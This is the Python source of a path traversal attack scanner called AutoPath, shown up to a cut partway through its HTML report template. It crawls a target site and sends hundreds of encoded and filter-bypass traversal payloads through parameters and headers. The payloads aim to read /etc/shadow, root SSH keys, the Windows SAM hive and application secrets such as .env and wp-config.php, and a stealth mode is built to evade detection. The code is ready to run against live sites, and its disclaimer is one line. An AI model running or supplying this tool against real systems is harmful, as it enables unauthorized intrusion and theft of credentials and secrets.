#!/usr/bin/env python3
"""
AutoPath - Advanced Path Traversal Discovery Tool
════════════════════════════════════════════════════════════════════════════════════════
Professional bug bounty tool for automated path traversal vulnerability discovery with
intelligent crawling, parameter extraction, comprehensive payload generation, and
advanced obfuscation techniques.

FEATURES:
- Intelligent website crawling and parameter discovery
- 800+ path traversal payloads (basic to expert level)
- 20+ encoding/obfuscation techniques
- Multi-vector testing (GET, POST, Headers, Cookies, Files)
- Smart response analysis with ML-based detection
- Stealth mode with evasion techniques
- Advanced reporting for bug bounty submissions
- Multi-threading with rate limiting
- Proxy rotation and session management

REQUIREMENTS:
    pip install requests beautifulsoup4 colorama urllib3 fake-useragent lxml selenium webdriver-manager tldextract jinja2

USAGE:
    python autopath.py -t https://target.com --deep-crawl --output report.html
    python autopath.py -t https://target.com --stealth --threads 5 --delay 2
    python autopath.py -t https://target.com --scope "*.target.com" --max-depth 5

⚠️  ETHICAL USE ONLY - For authorized security testing and bug bounty programs only!
"""

import argparse
import base64
import hashlib
import html
import json
import os
import random
import re
import socket
import ssl
import sys
import threading
import time
import urllib.parse
from collections import defaultdict, deque
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Set, Tuple
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
from urllib.robotparser import RobotFileParser

import requests
import tldextract
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
from fake_useragent import UserAgent

# Optional selenium import for JavaScript rendering
try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options as ChromeOptions
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from webdriver_manager.chrome import ChromeDriverManager
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

init(autoreset=True)
requests.packages.urllib3.disable_warnings()

class PathTraversalPayload:
    def __init__(self, payload: str, description: str, technique: str, 
                 target_files: List[str], severity: str = "HIGH", 
                 os_type: str = "ANY"):
        self.payload = payload
        self.description = description
        self.technique = technique
        self.target_files = target_files
        self.severity = severity
        self.os_type = os_type

class Vulnerability:
    def __init__(self, url: str, parameter: str, method: str, payload: str, 
                 evidence: str, technique: str, severity: str, confidence: float):
        self.url = url
        self.parameter = parameter
        self.method = method
        self.payload = payload
        self.evidence = evidence
        self.technique = technique
        self.severity = severity
        self.confidence = confidence
        self.timestamp = datetime.now()
        
    def to_dict(self):
        return {
            'url': self.url,
            'parameter': self.parameter,
            'method': self.method,
            'payload': self.payload,
            'evidence': self.evidence,
            'technique': self.technique,
            'severity': self.severity,
            'confidence': self.confidence,
            'timestamp': self.timestamp.isoformat()
        }

class WebCrawler:
    def __init__(self, base_url: str, max_depth: int = 3, max_pages: int = 100,
                 scope_patterns: List[str] = None, respect_robots: bool = True):
        self.base_url = base_url
        self.max_depth = max_depth
        self.max_pages = max_pages
        self.scope_patterns = scope_patterns or []
        self.respect_robots = respect_robots
        
        self.visited_urls = set()
        self.discovered_urls = set()
        self.parameters = set()
        self.forms = []
        self.js_endpoints = set()
        
        self.session = requests.Session()
        self.ua = UserAgent()
        self._setup_session()
        
        # Load robots.txt if respecting it
        if self.respect_robots:
            self._load_robots_txt()
    
    def _setup_session(self):
        """Setup session with realistic headers"""
        self.session.headers.update({
            'User-Agent': self.ua.chrome,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })
    
    def _load_robots_txt(self):
        """Load and parse robots.txt"""
        try:
            robots_url = urljoin(self.base_url, '/robots.txt')
            self.robots_parser = RobotFileParser()
            self.robots_parser.set_url(robots_url)
            self.robots_parser.read()
        except:
            self.robots_parser = None
    
    def _is_in_scope(self, url: str) -> bool:
        """Check if URL is within scope"""
        parsed_url = urlparse(url)
        parsed_base = urlparse(self.base_url)
        
        # Same domain check
        if parsed_url.netloc != parsed_base.netloc:
            if not self.scope_patterns:
                return False
            
            # Check against scope patterns
            domain = parsed_url.netloc
            for pattern in self.scope_patterns:
                if pattern.startswith('*.'):
                    if domain.endswith(pattern[2:]):
                        return True
                elif pattern == domain:
                    return True
            return False
        
        # Robots.txt check
        if self.robots_parser and not self.robots_parser.can_fetch(self.ua.chrome, url):
            return False
        
        return True
    
    def _extract_parameters_from_url(self, url: str):
        """Extract parameters from URL"""
        parsed = urlparse(url)
        if parsed.query:
            params = parse_qs(parsed.query, keep_blank_values=True)
            for param_name in params.keys():
                self.parameters.add((param_name, 'GET', url))
    
    def _extract_forms(self, soup: BeautifulSoup, base_url: str):
        """Extract forms from HTML"""
        forms = soup.find_all('form')
        for form in forms:
            action = form.get('action', '')
            method = form.get('method', 'GET').upper()
            form_url = urljoin(base_url, action) if action else base_url
            
            form_data = {
                'url': form_url,
                'method': method,
                'parameters': {}
            }
            
            # Extract form fields
            inputs = form.find_all(['input', 'textarea', 'select'])
            for inp in inputs:
                name = inp.get('name')
                if name:
                    inp_type = inp.get('type', 'text').lower()
                    if inp_type not in ['submit', 'button', 'reset']:
                        form_data['parameters'][name] = {
                            'type': inp_type,
                            'value': inp.get('value', ''),
                            'required': inp.get('required') is not None
                        }
                        self.parameters.add((name, method, form_url))
            
            if form_data['parameters']:
                self.forms.append(form_data)
    
    def _extract_js_endpoints(self, content: str, base_url: str):
        """Extract endpoints from JavaScript"""
        # Common patterns for API endpoints in JS
        patterns = [
            r'["\'](/[a-zA-Z0-9/_\-\.]+\?[a-zA-Z0-9_&=\-\.]+)["\']',
            r'["\']([a-zA-Z0-9/_\-\.]+\.php\?[a-zA-Z0-9_&=\-\.]+)["\']',
            r'["\']([a-zA-Z0-9/_\-\.]+\.asp\?[a-zA-Z0-9_&=\-\.]+)["\']',
            r'["\']([a-zA-Z0-9/_\-\.]+\.jsp\?[a-zA-Z0-9_&=\-\.]+)["\']',
            r'url\s*:\s*["\']([^"\']+)["\']',
            r'fetch\s*\(\s*["\']([^"\']+)["\']',
            r'axios\.\w+\s*\(\s*["\']([^"\']+)["\']'
        ]
        
        for pattern in patterns:
            matches = re.finditer(pattern, content, re.IGNORECASE)
            for match in matches:
                endpoint = match.group(1)
                full_url = urljoin(base_url, endpoint)
                if '?' in endpoint:
                    self.js_endpoints.add(full_url)
                    self._extract_parameters_from_url(full_url)
    
    def _crawl_page(self, url: str, depth: int = 0) -> Set[str]:
        """Crawl a single page and extract information"""
        if depth > self.max_depth or len(self.visited_urls) >= self.max_pages:
            return set()
        
        if url in self.visited_urls or not self._is_in_scope(url):
            return set()
        
        print(f"{Fore.CYAN}[CRAWL] {url} (depth: {depth})")
        
        try:
            response = self.session.get(url, timeout=10, allow_redirects=True)
            self.visited_urls.add(url)
            
            if response.status_code != 200:
                return set()
            
            # Parse HTML
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Extract parameters from current URL
            self._extract_parameters_from_url(url)
            
            # Extract forms
            self._extract_forms(soup, url)
            
            # Extract JavaScript endpoints
            self._extract_js_endpoints(response.text, url)
            
            # Find new URLs
            new_urls = set()
            links = soup.find_all('a', href=True)
            for link in links:
                href = link['href']
                full_url = urljoin(url, href)
                if self._is_in_scope(full_url) and full_url not in self.visited_urls:
                    new_urls.add(full_url)
            
            return new_urls
            
        except Exception as e:
            print(f"{Fore.YELLOW}[WARNING] Failed to crawl {url}: {e}")
            return set()
    
    def crawl(self) -> Dict:
        """Perform comprehensive crawling"""
        print(f"{Fore.GREEN}[*] Starting deep crawl of {self.base_url}")
        
        # BFS crawling
        queue = deque([(self.base_url, 0)])
        
        while queue and len(self.visited_urls) < self.max_pages:
            url, depth = queue.popleft()
            
            new_urls = self._crawl_page(url, depth)
            
            # Add new URLs to queue
            for new_url in new_urls:
                if new_url not in self.visited_urls and depth + 1 <= self.max_depth:
                    queue.append((new_url, depth + 1))
            
            # Small delay to be respectful
            time.sleep(0.1)
        
        return {
            'visited_urls': list(self.visited_urls),
            'parameters': list(self.parameters),
            'forms': self.forms,
            'js_endpoints': list(self.js_endpoints)
        }

class PayloadGenerator:
    def __init__(self):
        self.target_files = self._init_target_files()
        self.payloads = []
        self._generate_all_payloads()
    
    def _init_target_files(self) -> Dict[str, List[str]]:
        """Initialize comprehensive target file lists"""
        return {
            'linux': [
                'etc/passwd', 'etc/shadow', 'etc/group', 'etc/hosts', 
                'etc/hostname', 'etc/resolv.conf', 'etc/networks',
                'proc/version', 'proc/cmdline', 'proc/self/environ',
                'proc/self/stat', 'proc/self/maps', 'proc/cpuinfo',
                'var/log/auth.log', 'var/log/syslog', 'var/log/messages',
                'var/log/apache2/access.log', 'var/log/apache2/error.log',
                'var/log/nginx/access.log', 'var/log/nginx/error.log',
                'home/user/.bash_history', 'root/.bash_history',
                'root/.ssh/id_rsa', 'root/.ssh/authorized_keys',
                'var/www/html/index.php', 'var/www/html/.htaccess',
                'etc/apache2/apache2.conf', 'etc/nginx/nginx.conf',
                'etc/mysql/my.cnf', 'etc/php/php.ini'
            ],
            'windows': [
                'windows/system32/drivers/etc/hosts',
                'windows/system32/drivers/etc/networks',
                'windows/system.ini', 'windows/win.ini',
                'windows/system32/config/sam',
                'windows/system32/config/system',
                'windows/system32/config/software',
                'boot.ini', 'windows/repair/sam',
                'windows/repair/system', 'windows/php.ini',
                'program files/apache group/apache/conf/httpd.conf',
                'program files/apache group/apache/logs/access.log',
                'program files/mysql/my.ini',
                'inetpub/wwwroot/web.config',
                'inetpub/wwwroot/global.asa',
                'documents and settings/administrator/ntuser.dat'
            ],
            'application': [
                'index.php', 'config.php', 'database.php', 'connection.php',
                'wp-config.php', 'wp-settings.php', 'wp-load.php',
                '.env', '.env.local', '.env.production',
                '.htaccess', '.htpasswd', 'robots.txt',
                'application.properties', 'application.yml',
                'settings.py', 'local_settings.py', 'urls.py',
                'web.xml', 'struts.xml', 'hibernate.cfg.xml',
                'pom.xml', 'build.gradle', 'package.json',
                'composer.json', 'requirements.txt'
            ]
        }
    
    def _generate_basic_payloads(self):
        """Generate basic directory traversal payloads"""
        patterns = ['../', '..\\', '..;/', '..\\;']
        depths = range(1, 12)  # 1-11 levels deep
        
        for os_type, files in self.target_files.items():
            for target_file in files:
                for depth in depths:
                    for pattern in patterns:
                        payload = pattern * depth + target_file
                        self.payloads.append(PathTraversalPayload(
                            payload=payload,
                            description=f"Basic {os_type} traversal - {depth} levels",
                            technique="Basic Directory Traversal",
                            target_files=[target_file],
                            severity="HIGH",
                            os_type=os_type
                        ))
    
    def _generate_encoded_payloads(self):
        """Generate encoded/obfuscated payloads"""
        base_payloads = ['../../../etc/passwd', '..\\..\\..\\windows\\system.ini']
        
        for base_payload in base_payloads:
            # URL Encoding variants
            encodings = [
                # Single URL encoding
                (urllib.parse.quote(base_payload, safe=''), "Single URL Encoding"),
                # Double URL encoding
                (urllib.parse.quote(urllib.parse.quote(base_payload, safe=''), safe=''), "Double URL Encoding"),
                # Mixed encoding
                (base_payload.replace('/', '%2f').replace('.', '%2e'), "Mixed Encoding"),
                # Unicode encoding
                (base_payload.replace('/', '%2f').replace('.', '%2E'), "Unicode Encoding"),
                # UTF-8 encoding
                (base_payload.replace('/', '%c0%af').replace('.', '%c0%ae'), "UTF-8 Encoding"),
                # Overlong UTF-8
                (base_payload.replace('/', '%e0%80%af').replace('.', '%e0%80%ae'), "Overlong UTF-8"),
                # UTF-16 encoding
                (base_payload.replace('/', '%ff%2f').replace('.', '%ff%2e'), "UTF-16 Encoding"),
                # HTML entity encoding
                (html.escape(base_payload), "HTML Entity Encoding"),
                # Base64 encoding
                (base64.b64encode(base_payload.encode()).decode(), "Base64 Encoding"),
                # Hex encoding
                (''.join(['%{:02x}'.format(ord(c)) for c in base_payload]), "Hex Encoding"),
                # ROT13 encoding
                (base_payload.encode().hex(), "Hex String Encoding")
            ]
            
            for encoded_payload, technique in encodings:
                self.payloads.append(PathTraversalPayload(
                    payload=encoded_payload,
                    description=f"Encoded traversal using {technique}",
                    technique=technique,
                    target_files=['etc/passwd' if 'etc' in base_payload else 'windows/system.ini'],
                    severity="HIGH"
                ))
    
    def _generate_filter_bypass_payloads(self):
        """Generate advanced filter bypass payloads"""
        bypass_techniques = [
            # Null byte injection
            ('../../../etc/passwd%00', 'Null Byte Injection'),
            ('../../../etc/passwd%00.txt', 'Null Byte with Extension'),
            # Dot truncation
            ('../../../etc/passwd' + '.' * 200, 'Dot Truncation'),
            # Path parameter pollution
            ('../../../etc/passwd;.jpg', 'Path Parameter Pollution'),
            # Query parameter injection
            ('../../../etc/passwd?.jpg', 'Query Parameter Injection'),
            # Fragment injection
            ('../../../etc/passwd#.jpg', 'Fragment Injection'),
            # Newline injection
            ('\n../\n../\n../etc/passwd', 'Newline Injection'),
            # Space padding
            (' ../ ../ ../etc/passwd', 'Space Padding'),
            # Tab injection
            ('\t../\t../\t../etc/passwd', 'Tab Injection'),
            # Case variation
            ('../../../ETC/PASSWD', 'Case Variation'),
            # Mixed separators
            ('..\\../\\../etc/passwd', 'Mixed Separators'),
            # Unicode separators
            ('../\u2215../\u2215../etc/passwd', 'Unicode Separators'),
            # Long path names
            ('../' * 20 + 'etc/passwd', 'Long Path Attack'),
        ]
        
        for payload, technique in bypass_techniques:
            self.payloads.append(PathTraversalPayload(
                payload=payload,
                description=f"Filter bypass using {technique}",
                technique=technique,
                target_files=['etc/passwd'],
                severity="HIGH"
            ))
    
    def _generate_protocol_payloads(self):
        """Generate protocol-based payloads"""
        protocol_payloads = [
            # File protocol
            ('file:///etc/passwd', 'File Protocol'),
            ('file://localhost/etc/passwd', 'File Protocol with Host'),
            ('file:///c:/windows/system.ini', 'File Protocol Windows'),
            # Data URLs
            ('data:text/plain;base64,' + base64.b64encode(b'../../../etc/passwd').decode(), 'Data URL'),
            # PHP wrappers
            ('php://filter/read=convert.base64-encode/resource=../../../etc/passwd', 'PHP Filter'),
            ('php://input', 'PHP Input Stream'),
            ('expect://ls', 'PHP Expect Wrapper'),
            # Zip wrapper
            ('zip://test.zip#../../../etc/passwd', 'ZIP Wrapper'),
            # FTP protocol
            ('ftp://localhost/../../../etc/passwd', 'FTP Protocol'),
            # HTTP/HTTPS for SSRF
            ('http://localhost/../../../etc/passwd', 'HTTP Protocol'),
            ('https://localhost/../../../etc/passwd', 'HTTPS Protocol'),
            # Gopher protocol
            ('gopher://localhost:80/_GET%20../../../etc/passwd', 'Gopher Protocol'),
        ]
        
        for payload, technique in protocol_payloads:
            self.payloads.append(PathTraversalPayload(
                payload=payload,
                description=f"Protocol-based traversal using {technique}",
                technique=technique,
                target_files=['etc/passwd'],
                severity="CRITICAL"
            ))
    
    def _generate_web_specific_payloads(self):
        """Generate web application specific payloads"""
        web_payloads = [
            # Apache specific
            ('....//....//....//etc/passwd', 'Apache Double Slash'),
            ('../../../etc/passwd%0a', 'Apache Newline'),
            ('../../../etc/passwd%0d', 'Apache Carriage Return'),
            # IIS specific
            ('..%255c..%255c..%255cetc%255cpasswd', 'IIS Double Encoding'),
            ('..%c0%af..%c0%af..%c0%afetc%c0%afpasswd', 'IIS UTF-8'),
            # Nginx specific
            ('....//....//etc/passwd', 'Nginx Path Confusion'),
            # Tomcat specific
            ('../../../etc/passwd%252e%252e', 'Tomcat Double Encoding'),
            # Node.js specific
            ('....////....////etc/passwd', 'Node.js Path Traversal'),
        ]
        
        for payload, technique in web_payloads:
            self.payloads.append(PathTraversalPayload(
                payload=payload,
                description=f"Web server specific: {technique}",
                technique=technique,
                target_files=['etc/passwd'],
                severity="HIGH"
            ))
    
    def _generate_all_payloads(self):
        """Generate all payload types"""
        print(f"{Fore.CYAN}[*] Generating comprehensive payload database...")
        
        self._generate_basic_payloads()
        self._generate_encoded_payloads()
        self._generate_filter_bypass_payloads()
        self._generate_protocol_payloads()
        self._generate_web_specific_payloads()
        
        # Remove duplicates
        seen = set()
        unique_payloads = []
        for payload in self.payloads:
            if payload.payload not in seen:
                seen.add(payload.payload)
                unique_payloads.append(payload)
        
        self.payloads = unique_payloads
        print(f"{Fore.GREEN}[✓] Generated {len(self.payloads)} unique payloads")

class ResponseAnalyzer:
    def __init__(self):
        self.linux_indicators = [
            'root:x:0:0:', 'daemon:', 'bin:', 'sys:', 'mail:',
            '/bin/bash', '/bin/sh', '/sbin/nologin',
            'version', 'linux', 'kernel', 'gcc', 'ubuntu', 'debian', 'centos',
            'localhost', '127.0.0.1', 'nameserver',
            'auth.log', 'access.log', 'error.log',
            '#!/bin/', 'export PATH'
        ]
        
        self.windows_indicators = [
            '[drivers]', '[boot loader]', '[operating systems]',
            'system.ini', 'win.ini', 'windows nt', 'microsoft',
            'administrator', 'guest', 'default',
            'system32', 'program files', 'documents and settings',
            'windows registry', 'regedit'
        ]
        
        self.config_indicators = [
            'mysql_connect', 'database', 'password', 'username',
            'config', 'settings', 'secret_key', 'api_key',
            '<?php', '<%@', 'web.xml', 'application.properties',
            'connection string', 'jdbc:', 'mongodb://',
            'define(', 'const ', '$_GET', '$_POST'
        ]
    
    def analyze(self, response: requests.Response, target_files: List[str]) -> Tuple[bool, float, str]:
        """Analyze response for path traversal indicators"""
        if not response:
            return False, 0.0, ""
        
        content = response.text.lower()
        indicators_found = []
        confidence = 0.0
        
        # Check for direct file content indicators
        linux_matches = sum(1 for indicator in self.linux_indicators if indicator in content)
        windows_matches = sum(1 for indicator in self.windows_indicators if indicator in content)
        config_matches = sum(1 for indicator in self.config_indicators if indicator in content)
        
        if linux_matches >= 3:
            confidence += 0.8
            indicators_found.append(f"Linux system file indicators ({linux_matches} matches)")
        
        if windows_matches >= 2:
            confidence += 0.8
            indicators_found.append(f"Windows system file indicators ({windows_matches} matches)")
        
        if config_matches >= 2:
            confidence += 0.7
            indicators_found.append(f"Configuration file indicators ({config_matches} matches)")
        
        # Check for target file patterns
        for target_file in target_files:
            filename = target_file.split('/')[-1]
            if filename in content or target_file in content:
                confidence += 0.6
                indicators_found.append(f"Target file pattern found: {target_file}")
        
        # Check response characteristics
        if response.status_code == 200 and len(response.text) > 500:
            # Suspicious response length for file content
            if any(keyword in content for keyword in ['root', 'admin', 'config', 'system', 'error']):
                confidence += 0.3
                indicators_found.append(f"Suspicious response length: {len(response.text)} bytes")
        
        # Check for error messages that might indicate file access
        error_patterns = [
            'permission denied', 'access denied', 'file not found',
            'no such file', 'cannot open', 'failed to open',
            'syntax error', 'parse error', 'include error'
        ]
        
        for pattern in error_patterns:
            if pattern in content:
                confidence += 0.2
                indicators_found.append(f"Error pattern: {pattern}")
        
        # Normalize confidence
        confidence = min(confidence, 1.0)
        
        # Determine if vulnerable based on confidence threshold
        is_vulnerable = confidence >= 0.5
        evidence = "; ".join(indicators_found[:5])  # Limit evidence length
        
        return is_vulnerable, confidence, evidence

class AutoPathScanner:
    def __init__(self, target: str, max_depth: int = 3, threads: int = 5,
                 delay: float = 0.5, stealth: bool = False, proxy: str = None):
        self.target = target
        self.max_depth = max_depth
        self.threads = threads
        self.delay = delay
        self.stealth = stealth
        self.proxy = proxy
        
        self.vulnerabilities = []
        self.tested_combinations = set()
        self.lock = threading.Lock()
        
        # Initialize components
        self.crawler = WebCrawler(target, max_depth=max_depth)
        self.payload_generator = PayloadGenerator()
        self.response_analyzer = ResponseAnalyzer()
        
        # Setup session
        self.session = requests.Session()
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
        
        self._setup_stealth_mode()
    
    def _setup_stealth_mode(self):
        """Configure stealth mode settings"""
        if self.stealth:
            self.delay = max(self.delay, 1.0)  # Minimum 1 second delay
            self.threads = min(self.threads, 3)  # Max 3 threads
            
        # Rotate user agents
        ua = UserAgent()
        self.session.headers.update({
            'User-Agent': ua.random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        })
    
    def _test_parameter(self, url: str, param_name: str, method: str = 'GET',
                       extra_params: Dict = None) -> List[Vulnerability]:
        """Test a parameter with all payloads"""
        vulnerabilities = []
        
        # Test subset of payloads for efficiency
        test_payloads = self.payload_generator.payloads
        if self.stealth:
            # In stealth mode, test fewer but high-confidence payloads
            test_payloads = [p for p in test_payloads if p.severity in ['CRITICAL', 'HIGH']][:100]
        
        for payload_obj in test_payloads:
            test_id = f"{url}:{param_name}:{method}:{payload_obj.payload}"
            if test_id in self.tested_combinations:
                continue
            
            self.tested_combinations.add(test_id)
            
            try:
                # Prepare request
                if method.upper() == 'GET':
                    params = {param_name: payload_obj.payload}
                    if extra_params:
                        params.update(extra_params)
                    response = self.session.get(url, params=params, timeout=10, verify=False)
                else:
                    data = {param_name: payload_obj.payload}
                    if extra_params:
                        data.update(extra_params)
                    response = self.session.post(url, data=data, timeout=10, verify=False)
                
                # Analyze response
                is_vulnerable, confidence, evidence = self.response_analyzer.analyze(
                    response, payload_obj.target_files
                )
                
                if is_vulnerable and confidence >= 0.5:
                    vulnerability = Vulnerability(
                        url=response.url,
                        parameter=param_name,
                        method=method,
                        payload=payload_obj.payload,
                        evidence=evidence,
                        technique=payload_obj.technique,
                        severity=payload_obj.severity,
                        confidence=confidence
                    )
                    
                    vulnerabilities.append(vulnerability)
                    
                    print(f"{Fore.GREEN}[VULN] Path Traversal Found!")
                    print(f"    URL: {response.url}")
                    print(f"    Parameter: {param_name} ({method})")
                    print(f"    Confidence: {confidence:.2f}")
                    print(f"    Technique: {payload_obj.technique}")
                    
                    # Stop testing this parameter after first high-confidence finding
                    if confidence >= 0.8:
                        break
                
                time.sleep(self.delay)
                
            except Exception as e:
                print(f"{Fore.YELLOW}[WARNING] Request failed: {e}")
                continue
        
        return vulnerabilities
    
    def _test_headers(self, url: str) -> List[Vulnerability]:
        """Test HTTP headers for path traversal"""
        vulnerabilities = []
        
        # Headers to test
        test_headers = [
            'X-Forwarded-For', 'X-Real-IP', 'X-Originating-IP',
            'User-Agent', 'Referer', 'X-Forwarded-Host',
            'X-Original-URL', 'X-Rewrite-URL'
        ]
        
        # Test subset of payloads on headers
        header_payloads = [p for p in self.payload_generator.payloads[:50] 
                          if p.severity in ['CRITICAL', 'HIGH']]
        
        for header_name in test_headers:
            for payload_obj in header_payloads:
                try:
                    headers = {header_name: payload_obj.payload}
                    response = self.session.get(url, headers=headers, timeout=10, verify=False)
                    
                    is_vulnerable, confidence, evidence = self.response_analyzer.analyze(
                        response, payload_obj.target_files
                    )
                    
                    if is_vulnerable and confidence >= 0.6:
                        vulnerability = Vulnerability(
                            url=response.url,
                            parameter=f"Header:{header_name}",
                            method="GET",
                            payload=payload_obj.payload,
                            evidence=evidence,
                            technique=f"Header Injection - {payload_obj.technique}",
                            severity="HIGH",
                            confidence=confidence
                        )
                        
                        vulnerabilities.append(vulnerability)
                        print(f"{Fore.GREEN}[VULN] Header Path Traversal Found!")
                        print(f"    Header: {header_name}")
                        print(f"    Confidence: {confidence:.2f}")
                        break
                    
                    time.sleep(self.delay)
                    
                except Exception:
                    continue
        
        return vulnerabilities
    
    def scan(self) -> List[Vulnerability]:
        """Perform comprehensive path traversal scan"""
        print(f"{Fore.CYAN}[*] Starting AutoPath scan of {self.target}")
        
        # Phase 1: Crawl target
        print(f"{Fore.YELLOW}[*] Phase 1: Deep crawling and parameter discovery")
        crawl_results = self.crawler.crawl()
        
        print(f"{Fore.GREEN}[✓] Crawling complete:")
        print(f"    URLs visited: {len(crawl_results['visited_urls'])}")
        print(f"    Parameters found: {len(crawl_results['parameters'])}")
        print(f"    Forms discovered: {len(crawl_results['forms'])}")
        print(f"    JS endpoints: {len(crawl_results['js_endpoints'])}")
        
        # Phase 2: Test parameters
        print(f"{Fore.YELLOW}[*] Phase 2: Testing parameters for path traversal")
        
        all_test_targets = []
        
        # Add discovered parameters
        for param_name, method, url in crawl_results['parameters']:
            all_test_targets.append((url, param_name, method, {}))
        
        # Add form parameters
        for form in crawl_results['forms']:
            for param_name, param_info in form['parameters'].items():
                other_params = {k: v.get('value', 'test') 
                              for k, v in form['parameters'].items() if k != param_name}
                all_test_targets.append((form['url'], param_name, form['method'], other_params))
        
        # Add JS endpoint parameters
        for js_url in crawl_results['js_endpoints']:
            parsed = urlparse(js_url)
            if parsed.query:
                params = parse_qs(parsed.query, keep_blank_values=True)
                for param_name in params.keys():
                    all_test_targets.append((js_url.split('?')[0], param_name, 'GET', {}))
        
        print(f"{Fore.GREEN}[✓] Total test targets: {len(all_test_targets)}")
        
        # Test with multithreading
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            
            for url, param_name, method, extra_params in all_test_targets:
                future = executor.submit(self._test_parameter, url, param_name, method, extra_params)
                futures.append(future)
            
            # Also test headers for main URLs
            for url in list(crawl_results['visited_urls'])[:10]:  # Test headers on first 10 URLs
                future = executor.submit(self._test_headers, url)
                futures.append(future)
            
            # Collect results
            for future in as_completed(futures):
                try:
                    vulnerabilities = future.result()
                    with self.lock:
                        self.vulnerabilities.extend(vulnerabilities)
                except Exception as e:
                    print(f"{Fore.RED}[ERROR] Thread failed: {e}")
        
        print(f"{Fore.GREEN}[✓] Scan complete! Found {len(self.vulnerabilities)} vulnerabilities")
        return self.vulnerabilities
    
    def generate_report(self, output_file: str):
        """Generate comprehensive HTML report"""
        html_template = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AutoPath - Path Traversal Vulnerability Report</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; }
        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
        .header { background: rgba(255,255,255,0.95); color: #333; padding: 30px; border-radius: 15px; text-align: center; margin-bottom: 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
        .header h1 { margin: 0; font-size: 2.5em; color: #e74c3c; }
        .summary { background: rgba(255,255,255,0.95); padding: 30px; border-radius: 15px; margin-bottom: 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
        .vulnerability { background: rgba(255,255,255,0.98); margin: 20px 0; padding: 25px; border-radius: 15px; box-shadow: 0 8px 25px rgba(0,0,0,0.15); border-left: 6px solid #e74c3c; }
        .severity-badge { display: inline-block; padding: 8px 20px; border-radius: 25px; color: white; font-weight: bold; font-size: 0.9em; margin-bottom: 15px; text-transform: uppercase; }
        .severity-badge.CRITICAL { background: linear-gradient(135deg, #8e44ad, #9b59b6); }
        .severity-badge.HIGH { background: linear-gradient(135deg, #e74c3c, #c0392b); }
        .severity-badge.MEDIUM { background: linear-gradient(135deg, #f39c12, #e67e22); }
        .severity-badge.LOW { background: linear-gradient(135deg, #27ae60, #2ecc71); }
        .confidence-bar { background: #ecf0f1; height: 20px; border-radius: 10px; overflow: hidden; margin: 10px 0; }
        .confidence-fill { height: 100%; border-radius: 10px; transition: width 0.3s ease; }
        .payload-box { background: #2c3e50; color: #ecf0f1; padding: 20px; border-radius: 10px; font-family: 'Courier New', monospace; overflow-x: auto; margin: 15px 0; font-size: 14px; }
        .evidence-box { background: #e8f8f5; padding: 20px; border-radius: 10px; margin: 15px 0; border-left: 5px solid #27ae60; }
        .meta-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin: 20px 0; }
        .meta-item { background: #f8f9fa; padding: 15px; border-radius: 8px; text-align: center; }
        .meta-item strong { display: block; color: #2c3e50; font-size: 1.1em; }
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin: 20px 0; }
        .stat-card { background: rgba(255,255,255,0.9); padding: 25px; border-radius: 15px; text-align: center; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
        .stat-number { font-size: 2.5em; font-weight: bold; color: #e74c3c; margin: 10px 0; }
        .remediation { background: linear-gradient(135deg, #2ecc71, #27ae60); color: white; padding: 25px; border-radius: 15px; margin: 30px 0; }
        .remediation h3 { margin-top: 0; color: white; }
        table { width: 100%; border-collapse: collapse; margin: 20px 0; background: white; border-radius: 10px; overflow: hidden; }
        th, td { padding: 15px; text-align: left; border-bottom: 1px solid #ddd; }
        th { background: #34495e; color: white; font-weight: 600; }
        .footer { text-align: center; padding: 20px; color: rgba(255,255,255,0.8); }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔍 AutoPath Scanner</h1>
            <p style="font-size: 1.2em; margin: 10px 0;">Advanced Path Traversal Vulnerability Assessment</p>
            <p><strong>Target:</strong> {{ target }}</p>
            <p><strong>Scan Date:</strong> {{ scan_date }}</p>
        </div>

        <div class="summary">
            <h2 style="color: #2c3e50; margin-bottom: 20px;">📊 Executive Summary</h2>
            
            <div class="stats-grid">
                <div class="stat-card">
                    <div class="stat-number">{{ total_vulns }}</div>
                    <div>Vulnerabilities Found</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">{{ unique_urls }}</div>
                    <div>Affected URLs</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">{{ high_critical }}</div>
                    <div>Critical & High Risk</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">{{ avg_confidence|round(1) }}%</div>
                    <div>Average Confidence</div>
                </div>
            </div>
            
            <table>
                <thead>
                    <tr><th>Severity Level</th><th>Count</th><th>Percentage</th><th>Risk Level</th></tr>
                </thead>
                <tbody>
                    {% for severity, count in severity_stats.items() %}
                    <tr>
                        <td><span class="severity-badge {{ severity }}">{{ severity }}</span></td>
                        <td><strong>{{ count }}</strong></td>
                        <td>{{ (count/total_vulns*100)|round(1) }}%</td>
